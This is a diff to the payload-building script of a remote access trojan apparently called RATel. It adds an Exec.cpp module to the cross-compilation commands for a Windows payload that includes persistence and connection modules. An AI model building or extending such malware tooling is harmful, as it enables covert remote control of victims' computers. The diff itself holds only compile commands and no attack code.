@@ -73,9 +73,9 @@ class GeneratePayload:
 
         if(self.os == "Linux"):
             #if os is linux <3
-            cmd = "i686-w64-mingw32-g++ main.cpp  other.cpp   HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
+            cmd = "i686-w64-mingw32-g++ main.cpp Exec.cpp other.cpp   HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
         elif(self.os == "Windows"):
-            cmd = "g++ main.cpp HandShake.cpp  Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -Os -s".format(current_path+"/payload/"+self.name)
+            cmd = "g++ main.cpp Exec.cpp HandShake.cpp  Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -Os -s".format(current_path+"/payload/"+self.name)
         else:
             other.printColor("error","[-] RATel is incompatible with: {}".format(self.os))
             other.printColor("error","[-] please try to restart the RATelgenerator on Windows or Linux.")
@@ -111,9 +111,7 @@ class GeneratePayload:
         self.compilate() #compilate
         time.sleep(2) #tempo 
         self.writeFile(str(other.commonHeader())) #rewrite default header
-
         pass
-
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-a","--auto", action="store_true", default=False, help="if the parameter is added, the rat will automatically perform the persistence.")
